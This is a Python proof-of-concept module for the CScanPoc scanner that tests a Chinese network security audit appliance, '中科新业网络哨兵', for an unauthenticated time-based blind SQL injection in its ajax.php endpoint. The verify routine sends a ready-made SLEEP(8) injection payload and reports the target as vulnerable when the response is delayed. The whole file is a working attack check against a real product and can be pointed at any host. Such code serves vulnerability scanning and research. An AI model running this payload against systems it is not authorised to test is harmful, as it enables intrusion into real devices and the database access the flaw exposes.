# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Seentech_0021'  # 平台漏洞编号，留空
    name = '中科新业网络哨兵 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-14'  # 漏洞公布时间
    desc = '''   
        中科新业网络安全审计系统 /manage/main/tree/tree/ajax.php SQL注入（无需登录DBA权限。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '中科新业网络哨兵'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd04f0aa0-9b30-4cee-ac51-88a644510116'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2010-0133628
            hh = hackhttp.hackhttp()
            url = self.target + "/manage/main/tree/tree/ajax.php?action=expand_node&id=123"
            payload1 = "+AND+(SELECT+*+FROM+(SELECT(SLEEP(8)))ToKi)"
            t1 = time.time()
            code1, _, _, _, _ = hh.http(url)
            true_time = time.time() - t1
            t2 = time.time()
            code2, _, _, _, _ = hh.http(url + payload1)
            false_time = time.time() - t2
            if code1 == 200 and code2 == 200 and false_time - true_time > 7:
                # security_hole(url+payload1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
